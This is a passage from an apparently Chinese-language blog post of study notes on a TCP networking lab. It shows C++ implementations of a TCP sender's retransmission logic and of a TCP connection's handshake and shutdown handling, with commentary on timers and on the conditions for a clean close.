class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_sender.hh&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_config.hh&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;random&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">/* TCPSender constructor (uses a random ISN if none given) */</span><br>TCPSender::<span class="hljs-built_in">TCPSender</span>(<span class="hljs-type">uint64_t</span> initial_RTO_ms, optional&lt;Wrap32&gt; fixed_isn)<br>    : <span class="hljs-built_in">isn_</span>(fixed_isn.<span class="hljs-built_in">value_or</span>(Wrap32 &#123;<span class="hljs-built_in">random_device</span>()()&#125;)), <span class="hljs-built_in">initial_RTO_ms_</span>(initial_RTO_ms)<br>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">TCPSender::sequence_numbers_in_flight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> outstanding_seqno_; &#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">TCPSender::consecutive_retransmissions</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> consecutive_retransmission_times_; &#125;<br><br><span class="hljs-function">optional&lt;TCPSenderMessage&gt; <span class="hljs-title">TCPSender::maybe_send</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!segments_out_.<span class="hljs-built_in">empty</span>() &amp;&amp; set_syn_) &#123;<br>        TCPSenderMessage segment = std::<span class="hljs-built_in">move</span>(segments_out_.<span class="hljs-built_in">front</span>());<br>        segments_out_.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> segment;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::push</span><span class="hljs-params">(Reader &amp;outbound_stream)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// ws默认从receiver的返回结果中取，娶不到默认为1</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> curr_window_size = window_size_ ? window_size_ : <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 填充</span><br>    <span class="hljs-keyword">while</span> (curr_window_size &gt; outstanding_seqno_) &#123;<br>        TCPSenderMessage msg;<br><br>        <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>            msg.SYN = <span class="hljs-literal">true</span>;<br>            set_syn_ = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        msg.seqno = <span class="hljs-built_in">get_next_seqno</span>();<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> payload_size<br>            = <span class="hljs-built_in">min</span>(TCPConfig::MAX_PAYLOAD_SIZE, curr_window_size - outstanding_seqno_ - msg.SYN);<br>        std::string payload = std::<span class="hljs-built_in">string</span>(outbound_stream.<span class="hljs-built_in">peek</span>()).<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, payload_size);<br>        outbound_stream.<span class="hljs-built_in">pop</span>(payload_size);<br><br>        <span class="hljs-keyword">if</span> (!set_fin_ &amp;&amp; outbound_stream.<span class="hljs-built_in">is_finished</span>()<br>            &amp;&amp; payload.<span class="hljs-built_in">size</span>() + outstanding_seqno_ + msg.SYN &lt; curr_window_size) &#123;<br>            msg.FIN = <span class="hljs-literal">true</span>;<br>            set_fin_ = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        msg.payload = <span class="hljs-built_in">Buffer</span>(std::<span class="hljs-built_in">move</span>(payload));<br><br>        <span class="hljs-comment">// no data, stop sending</span><br>        <span class="hljs-keyword">if</span> (msg.<span class="hljs-built_in">sequence_length</span>() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// no outstanding segments, restart timer</span><br>        <span class="hljs-keyword">if</span> (outstanding_seg_.<span class="hljs-built_in">empty</span>()) &#123;<br>            RTO_timeout_ = initial_RTO_ms_;<br>            timer_ = <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 还没发送，放入未确认缓存</span><br>        segments_out_.<span class="hljs-built_in">push</span>(msg);<br><br>      <span class="hljs-comment">// 当然，未确认的序列号也要相应增加</span><br>        outstanding_seqno_ += msg.<span class="hljs-built_in">sequence_length</span>();<br>        <span class="hljs-comment">// &#123; next_abs_seqno_: msg &#125;</span><br>      outstanding_seg_.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">make_pair</span>(next_abs_seqno_, msg));<br>        <span class="hljs-comment">// 增加</span><br>      next_abs_seqno_ += msg.<span class="hljs-built_in">sequence_length</span>();<br><br>       <span class="hljs-comment">// 如果是FIN报道文，直接结束</span><br>        <span class="hljs-keyword">if</span> (msg.FIN) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">TCPSenderMessage <span class="hljs-title">TCPSender::send_empty_message</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>    TCPSenderMessage segment;<br>    segment.seqno = <span class="hljs-built_in">get_next_seqno</span>();<br><br>    <span class="hljs-keyword">return</span> segment;<br>&#125;<br><br><span class="hljs-comment">// receive =&gt; push =&gt; send</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::receive</span><span class="hljs-params">(<span class="hljs-type">const</span> TCPReceiverMessage &amp;msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!msg.ackno.<span class="hljs-built_in">has_value</span>()) &#123;<br>        ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> recv_abs_seqno = msg.ackno.<span class="hljs-built_in">value</span>().<span class="hljs-built_in">unwrap</span>(isn_, next_abs_seqno_);<br>        <span class="hljs-keyword">if</span> (recv_abs_seqno &gt; next_abs_seqno_) &#123;<br>            <span class="hljs-comment">// Impossible, we couldn&#x27;t transmit future data</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = outstanding_seg_.<span class="hljs-built_in">begin</span>(); iter != outstanding_seg_.<span class="hljs-built_in">end</span>();) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[abs_seqno, segment] = *iter;<br>          <span class="hljs-comment">// 如果当前的未发送的片段的序列号小于已经确认的，说明是已经确认了</span><br>            <span class="hljs-keyword">if</span> (abs_seqno + segment.<span class="hljs-built_in">sequence_length</span>() &lt;= recv_abs_seqno) &#123;<br>                outstanding_seqno_ -= segment.<span class="hljs-built_in">sequence_length</span>();<br>                iter = outstanding_seg_.<span class="hljs-built_in">erase</span>(iter);<br>                <span class="hljs-comment">// reset RTO and if outstanding data is not empty, start timer，为什么要重新计时？</span><br>                RTO_timeout_ = initial_RTO_ms_;<br>                <span class="hljs-keyword">if</span> (!outstanding_seg_.<span class="hljs-built_in">empty</span>()) &#123;<br>                    timer_ = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        consecutive_retransmission_times_ = <span class="hljs-number">0</span>;<br>    &#125;<br>    window_size_ = msg.window_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span></span><br><span class="hljs-function"></span>&#123;<br>    timer_ += ms_since_last_tick;<br>    <span class="hljs-keyword">auto</span> iter = outstanding_seg_.<span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">if</span> (timer_ &gt;= RTO_timeout_ &amp;&amp; iter != outstanding_seg_.<span class="hljs-built_in">end</span>()) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[abs_seqno, segment] = *iter;<br>        <span class="hljs-keyword">if</span> (window_size_ &gt; <span class="hljs-number">0</span>) &#123;<br>            RTO_timeout_ *= <span class="hljs-number">2</span>;<br>        &#125;<br>        timer_ = <span class="hljs-number">0</span>;<br>        consecutive_retransmission_times_++;<br>        segments_out_.<span class="hljs-built_in">push</span>(segment);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>tick可以理解为心脏跳动，每隔一段时间自动调用，理想情况下这个时间间隔是一样的（但实际是这样吗？），而基于tick方法可以设置一个定时器，比如说，当开始发送的时候，定时器标志位为true，并且timer=0，每次调用tick方法都会累计timer的值，如果segment发送并在规定时间内返回，则timerreset为0，同时处理掉缓存区那些已经确认的segment；与此同时，由于tick定期调用，如果发现timer超时了，则重新发送最旧的没有收到对应ack的segment；</p><blockquote><p>这里有个细节问题：当收到有效的ackno的时候，始终resettimer，很明显不会触发重新发送，这个时候有没有可能实际上之前发送的某个segment超时了呢？然而没触发超时。</p><p>这和超时时间的设置有很大关系，假设当前发送的sgement丢失了，然后Sender调用receive，此时由于没有正确的ackno并不会reset计时器，继而send下一个segment，并收到响应（这个时候前一个timer的时间就达到了&gt;2RTT），在还没调用本次receive方法之前，就触发了超时重传，</p><p>seqno和ackseqno究竟是什么</p><p>tcp是以segment为单位进行发送和接收的，会丢失segment</p><p>当发生segment丢失，接收方做什么？</p><p>不会调用receive方法，如果下一个响应到来，对该segment调用receive方法，</p></blockquote><h2 id="tcp-connection">TCP Connection</h2><p>TCPConnection的一个重要功能是决定TCP连接什么时候完全结束。当TCP连接完全结束时，停止对任何接收到的segment回复ackno，并且active()方法返回false。</p><p>TCP连接有两种关闭的方法：</p><p>不干净的关闭：TCPConnection发送或接收到一个首部字段中的RST标志位被设置的segment。这种情况下，inbound和outbound的ByteStream都处于errorstate，并且active()方法可以马上返回false 。</p><p>干净的关闭：在没有error的情况下关闭（active()=false）。这种情况可以尽可能地保证两个字节流都完全可靠地交付到接收对等方。</p><p>由于两将军问题，不可能保证对等方都能完全干净关闭连接，但是可以非常接近。</p><p>从一个对等设备的角度来看，对其与“远程”对等设备的连接进行干净关闭有四个先决条件，条件1保证了输入流被读取干净了，条件2和3保证了输出流被对等方读取干净了。条件4也是关于输入流的，保证了输入流的正常关闭。</p><p>输入流被完全确认（StreamReassembler为空）并且结束（收到了FIN）</p><p>输出流被应用层结束（调用ByteStream的end_input()方法），并且被完全发送出去（ByteStream为空），首部字段包括FIN的segment也被发送出去。</p><p>输出流被对等方完全确认（对方的StreamReassembler为空，实际上要求本地的_outstanding_segments为空）</p><p>本地TCPConnection需要让对等方满足条件3。有两种方式：</p><p>选择A：在两个流都已经结束后 linger 一段时间：</p><p>本地TCPConnection确认了整个输入流，但是难以确认对等端是否知道自己确认了整个输入流，即对等端是否收到ack（因为对等端不会对本地发送的ack进行ack）。如果不能确保对等端收到ack，也就不能确保对等端的_outstanding_segments为空，那么对等端就有可能不停地重传无法得到本地确认的segment，输入流永远无法关闭。</p><p>我们可以让本地的TCPConnection等待一段时间，如果对等端没有重传任何东西，那么就可以相信对等端收到了ack。</p><p>具体地，当一个连接满足条件1到条件3，并且在收到对等端最后一个segment后，等待了至少初始重传超时时间（_cfg.rt_timeout）的十倍，才能断开。</p><p>这意味着TCPConnection需要保持alive一段时间，保持对本地端口号的独占声明并可能发送acks 以响应传入的segment，即使在 TCPSender 和 TCPReceiver完全完成其工作并且两个流都已经结束了。</p><p>选择B：被动关闭</p><p>如果在TCPConnection发送FIN之前，TCPConnection的输入流就结束了（收到了FIN），那么这个TCPConnection在两个流结束后不需要linger。（因为FIN在发送ack之后，所以FIN的seqno大于之前发送的ack，所以对方对FIN的确认，就相当于确认了之前发送的所有ack</p><p>在lab 4中，我们将创建总体模块，称为TCPconnection，该模块将TCPSender和TCPReceiver结合起来。</p><p>我们的TCPsegment可以封装到用户(TCP-In-UDP)或IP(TCP/IP)数据报的有效载荷中。</p><p>https://blog.csdn.net/qq_45698833/article/details/120536017</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_connection.hh&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::remaining_outbound_capacity</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">remaining_capacity</span>(); &#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::bytes_in_flight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _sender.<span class="hljs-built_in">bytes_in_flight</span>(); &#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::unassembled_bytes</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _receiver.<span class="hljs-built_in">unassembled_bytes</span>(); &#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::time_since_last_segment_received</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _time_since_last_segment_received;&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TCPConnection::active</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> _active; &#125;<br><br><span class="hljs-comment">// 由操作系统调用，接收从UDP或IP数据报中的解封装的TCPsegment</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::segment_received</span><span class="hljs-params">(<span class="hljs-type">const</span> TCPSegment &amp;seg)</span> </span>&#123; <br>    <span class="hljs-comment">// 如果连接断开了，不接收任何segment</span><br>    <span class="hljs-keyword">if</span>(!_active)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 接收到一个segment，重置计数</span><br>    _time_since_last_segment_received = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 被动建立连接的一方可能处于的状态,处于listen状态</span><br>    <span class="hljs-comment">// 没有收到过任何segment，也没有发送过任何segment,</span><br>    <span class="hljs-keyword">if</span>(!_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>() &amp;&amp; _sender.<span class="hljs-built_in">next_seqno_absolute</span>() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 只接收syn</span><br>        <span class="hljs-keyword">if</span>(!seg.<span class="hljs-built_in">header</span>().syn)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        _receiver.<span class="hljs-built_in">segment_received</span>(seg);<br>        <span class="hljs-comment">// 收到对方的syn，就发送SYN与对方建立连接，处于SYN_RECV状态</span><br>        <span class="hljs-comment">// 三次握手的阶段二</span><br>        <span class="hljs-built_in">connect</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 主动建立连接的一方可能处于的状态,处于SYN_SENT状态，三次握手的阶段一</span><br>    <span class="hljs-comment">// 发送出去的流没有得到确认，也没有收到过对方的segment。</span><br>    <span class="hljs-keyword">if</span>(_sender.<span class="hljs-built_in">next_seqno_absolute</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; _sender.<span class="hljs-built_in">bytes_in_flight</span>() == _sender.<span class="hljs-built_in">next_seqno_absolute</span>() &amp;&amp; <br>       !_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>())&#123;<br>        <span class="hljs-comment">// 如果有效载荷不为0，不符合SYN，直接丢弃</span><br>        <span class="hljs-keyword">if</span>(seg.<span class="hljs-built_in">payload</span>().<span class="hljs-built_in">size</span>() )&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 如果ack等于0，则双方同时发起了建立连接</span><br>        <span class="hljs-keyword">if</span>(!seg.<span class="hljs-built_in">header</span>().ack)&#123;<br>            <span class="hljs-keyword">if</span>(seg.<span class="hljs-built_in">header</span>().syn)&#123;<br>                _receiver.<span class="hljs-built_in">segment_received</span>(seg);<br>                <span class="hljs-comment">// 发送空的segment，以返回ack</span><br>                _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 如果syn=1，ack=1，rst=1，则关闭连接</span><br>        <span class="hljs-keyword">if</span>(seg.<span class="hljs-built_in">header</span>().rst)&#123;<br>            _receiver.<span class="hljs-built_in">stream_out</span>().<span class="hljs-built_in">set_error</span>();<br>            _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">set_error</span>();<br>            _active = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 如果syn=1，ack=1，rst!=1，或者其他情况</span><br>    _receiver.<span class="hljs-built_in">segment_received</span>(seg);<br>    _sender.<span class="hljs-built_in">ack_received</span>(seg.<span class="hljs-built_in">header</span>().ackno,seg.<span class="hljs-built_in">header</span>().win);<br>    <span class="hljs-comment">// 发送确认的报文，进入ESTABLISHED状态，连接建立。处于三次握手的第三阶段</span><br>    <span class="hljs-keyword">if</span> (_sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">buffer_empty</span>() &amp;&amp; seg.<span class="hljs-built_in">length_in_sequence_space</span>())<br>        _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>    <span class="hljs-keyword">if</span> (seg.<span class="hljs-built_in">header</span>().rst) &#123;<br>        _sender.<span class="hljs-built_in">send_empty_segment</span>();<br>        <span class="hljs-built_in">unclean_shutdown</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">TCPConnection::write</span><span class="hljs-params">(<span class="hljs-type">const</span> string &amp;data)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(data.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 向TCPSender的ByteStream中写入数据</span><br>    <span class="hljs-type">size_t</span> write_size = _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">write</span>(data);<br>    _sender.<span class="hljs-built_in">fill_window</span>();<br>    <span class="hljs-comment">// 对TCPSender中的segment设置ackno和windowsize,再发送给对等端</span><br>    <span class="hljs-built_in">send_sender_segments</span>();<br>    <span class="hljs-keyword">return</span> write_size;<br>&#125;<br><br><span class="hljs-comment">// 此方法被OS周期性调用</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::tick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ms_since_last_tick)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(!_active)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    _time_since_last_segment_received += ms_since_last_tick;<br>    <span class="hljs-comment">// 告知TCPSender过去的时间</span><br>    _sender.<span class="hljs-built_in">tick</span>(ms_since_last_tick);<br>    <span class="hljs-comment">// 如果连续重传的次数超过上限，则强制关闭连接</span><br>    <span class="hljs-keyword">if</span>(_sender.<span class="hljs-built_in">consecutive_retransmissions</span>() &gt; TCPConfig::MAX_RETX_ATTEMPTS)&#123;<br>        <span class="hljs-built_in">unclean_shutdown</span>();    <br>    &#125;<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><span class="hljs-comment">// 结束向TCPConnection中写入，也就是关闭输出流（仍然允许读取输入的数据）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::end_input_stream</span><span class="hljs-params">()</span> </span>&#123;<br>    _sender.<span class="hljs-built_in">stream_in</span>().<span class="hljs-built_in">end_input</span>();<br>    <span class="hljs-comment">// 发送fin，不能保证这一次能将fin发送出去，因为接收窗口有可能空间不够，ByteStream无法全部发送出去</span><br>    _sender.<span class="hljs-built_in">fill_window</span>();<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><span class="hljs-comment">// 主动连接</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::connect</span><span class="hljs-params">()</span> </span>&#123;<br>    _sender.<span class="hljs-built_in">fill_window</span>();<br>    <span class="hljs-built_in">send_sender_segments</span>();<br>&#125;<br><br><br><br><span class="hljs-comment">// 对TCPSender的 _segments_out中的segment设置首部的ackno和windowsize字段，还有ACK标志位</span><br><span class="hljs-comment">// 再加入到TCPConnection的 _segments_out，真正地将TCPsegment发送出去</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::send_sender_segments</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">// 此处必须要是引用类型，才能指向_sender中的同一个成员变量,才能对其进行操作</span><br>    <span class="hljs-comment">// std::queue&lt;TCPSegment&gt;&amp;sender_segs_out = _sender.segments_out();</span><br><br>    <span class="hljs-comment">// 对TCPSender的 _segments_out进行遍历，将所有的segment的头部都加上ackno和windowsize</span><br>    <span class="hljs-comment">// 再发送出去</span><br>    <span class="hljs-keyword">while</span>(!_sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">empty</span>())&#123;<br>        TCPSegment seg = _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">front</span>();<br>        _sender.<span class="hljs-built_in">segments_out</span>().<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-comment">// 只有当ackno()的返回值非空时，才需要加上</span><br>        <span class="hljs-keyword">if</span>(_receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">has_value</span>())&#123;<br>            seg.<span class="hljs-built_in">header</span>().ack = <span class="hljs-literal">true</span>;<br>            seg.<span class="hljs-built_in">header</span>().ackno = _receiver.<span class="hljs-built_in">ackno</span>().<span class="hljs-built_in">value</span>();<br>            seg.<span class="hljs-built_in">header</span>().win = _receiver.<span class="hljs-built_in">window_size</span>();<br>        &#125;<br>        <span class="hljs-comment">// 将segment真正发送出去</span><br>        _segments_out.<span class="hljs-built_in">push</span>(seg);<br>    &#125;<br>    <span class="hljs-comment">// 每次发送segment后，都需要判断是否需要干净关闭连接</span><br>    <span class="hljs-built_in">clean_shutdown</span>();<br>    <br>&#125;<br><span class="hljs-comment">// 不干净的关闭，直接强制关闭连接</span><br><span class="hljs-comment">// 将输入输出流设置为错误状态</span><br><span class="hljs-comment">// 将连接的active置为false，向对等方发送rst</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPConnection::unclean_shutdown</span><span class="hljs-params">()</span></span>&#123;<br>    _receiver.<span 